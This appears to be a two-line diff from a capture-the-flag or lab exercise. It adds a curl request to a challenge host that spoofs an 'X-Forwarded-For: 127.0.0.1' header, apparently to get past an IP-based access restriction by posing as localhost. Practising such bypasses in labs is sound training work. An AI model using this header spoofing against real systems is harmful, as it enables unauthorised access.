@@ -1,0 +1,2 @@
+URL="https://chl-205fef06-b61b-4038-89c4-b67c61b8ccde-ventas.softwareseguro.com.ar/ventas/?id=1"
+curl -s -i -H "X-Forwarded-For: 127.0.0.1" "$URL"
